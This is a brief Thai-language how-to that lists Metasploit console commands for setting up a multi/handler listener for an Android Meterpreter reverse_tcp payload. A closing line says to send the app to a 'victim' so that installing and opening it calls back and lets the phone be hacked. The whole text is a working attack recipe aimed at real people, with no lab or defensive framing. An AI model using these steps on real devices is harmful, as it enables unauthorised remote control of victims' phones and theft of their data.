# วิธีสร้างการเชื่อมต่อ Payload
เขียน : msfconsole
เขียน : use multi/handler
เขียน : set payload android/meterpreter/reverse_tcp 
เขียน : set LHOST IPที่ตั้งไว้
เขียน : set LPORT Portที่ตั้งไว้
เขียน : run
# สร้างการเชื่อมต่อเสร็จเเล้ว สิ่งที่ต้องทําต่อไปคือส่งเเอปไปให้เหยื่อ พอเหยื่อกดติดตั้ง+เปิดเเอป จะมีการเชื่อมต่อกลับมา พอมีการเชื่อมต่อกลับมาเราจะสามารถเเฮกเครื่องมือถือได้
